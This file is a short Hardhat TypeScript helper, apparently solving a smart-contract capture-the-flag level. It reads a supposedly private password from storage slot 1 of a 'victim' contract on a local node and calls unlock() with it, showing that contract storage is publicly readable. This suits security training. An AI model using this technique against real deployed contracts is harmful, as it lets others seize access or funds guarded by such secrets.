import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const provider = new ethers.providers.JsonRpcProvider(
    "http://127.0.0.1:8545"
  );
  const password = await provider.getStorageAt(victim.address, 1);
  await victim.unlock(password);
};

export default helper;
